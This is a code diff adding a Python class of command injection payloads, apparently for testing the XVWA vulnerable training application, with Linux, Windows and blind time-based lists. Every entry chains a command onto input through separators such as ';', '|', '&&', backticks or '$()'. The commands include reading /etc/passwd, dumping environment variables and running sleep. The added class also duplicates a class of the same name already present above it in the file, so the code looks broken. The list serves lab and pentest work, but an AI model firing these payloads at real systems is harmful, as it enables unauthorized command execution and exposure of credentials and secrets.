@@ -76,3 +76,133 @@ class CommandInjectionPayloads:
         payloads.extend(CommandInjectionPayloads.get_windows_payloads())
         payloads.extend(CommandInjectionPayloads.get_blind_payloads())
         return payloads
+class CommandInjectionPayloads:
+    """Command Injection payload collection optimized for XVWA"""
+    
+    @staticmethod
+    def get_linux_payloads() -> List[str]:
+        """Linux command injection payloads that work on XVWA"""
+        return [
+            "; id",
+            "| id",
+            "& id",
+            "&& id",
+            "|| id",
+            "`id`",
+            "$(id)",
+            "; whoami",
+            "| whoami",
+            "& whoami",
+            "&& whoami",
+            "|| whoami",
+            "`whoami`",
+            "$(whoami)",
+            "; uname -a",
+            "| uname -a",
+            "& uname -a",
+            "&& uname -a",
+            "|| uname -a",
+            "`uname -a`",
+            "$(uname -a)",
+            "; cat /etc/passwd",
+            "| cat /etc/passwd",
+            "& cat /etc/passwd",
+            "&& cat /etc/passwd",
+            "|| cat /etc/passwd",
+            "`cat /etc/passwd`",
+            "$(cat /etc/passwd)",
+            "; ls -la",
+            "| ls -la",
+            "& ls -la",
+            "&& ls -la",
+            "|| ls -la",
+            "`ls -la`",
+            "$(ls -la)",
+            "; ps aux",
+            "| ps aux",
+            "& ps aux",
+            "&& ps aux",
+            "|| ps aux",
+            "`ps aux`",
+            "$(ps aux)",
+            "; pwd",
+            "| pwd",
+            "& pwd",
+            "&& pwd",
+            "|| pwd",
+            "`pwd`",
+            "$(pwd)",
+            "; env",
+            "| env",
+            "& env",
+            "&& env",
+            "|| env",
+            "`env`",
+            "$(env)"
+        ]
+
+    @staticmethod
+    def get_windows_payloads() -> List[str]:
+        """Windows command injection payloads that work on XVWA"""
+        return [
+            "& whoami",
+            "&& whoami",
+            "| whoami",
+            "|| whoami",
+            "; whoami",
+            "& ver",
+            "&& ver",
+            "| ver",
+            "|| ver",
+            "; ver",
+            "& dir",
+            "&& dir",
+            "| dir",
+            "|| dir",
+            "; dir",
+            "& ipconfig",
+            "&& ipconfig",
+            "| ipconfig",
+            "|| ipconfig",
+            "; ipconfig",
+            "& netstat -an",
+            "&& netstat -an",
+            "| netstat -an",
+            "|| netstat -an",
+            "; netstat -an",
+            "& tasklist",
+            "&& tasklist",
+            "| tasklist",
+            "|| tasklist",
+            "; tasklist",
+            "& systeminfo",
+            "&& systeminfo",
+            "| systeminfo",
+            "|| systeminfo",
+            "; systeminfo"
+        ]
+
+    @staticmethod
+    def get_blind_payloads() -> List[str]:
+        """Blind command injection payloads for XVWA"""
+        return [
+            "; sleep 5",
+            "| sleep 5",
+            "& sleep 5",
+            "&& sleep 5",
+            "|| sleep 5",
+            "`sleep 5`",
+            "$(sleep 5)",
+            "; ping -c 5 127.0.0.1",
+            "| ping -c 5 127.0.0.1",
+            "& ping -c 5 127.0.0.1",
+            "&& ping -c 5 127.0.0.1",
+            "|| ping -c 5 127.0.0.1",
+            "`ping -c 5 127.0.0.1`",
+            "$(ping -c 5 127.0.0.1)",
+            "; ping -n 5 127.0.0.1",
+            "| ping -n 5 127.0.0.1",
+            "& ping -n 5 127.0.0.1",
+            "&& ping -n 5 127.0.0.1",
+            "|| ping -n 5 127.0.0.1"
+        ]
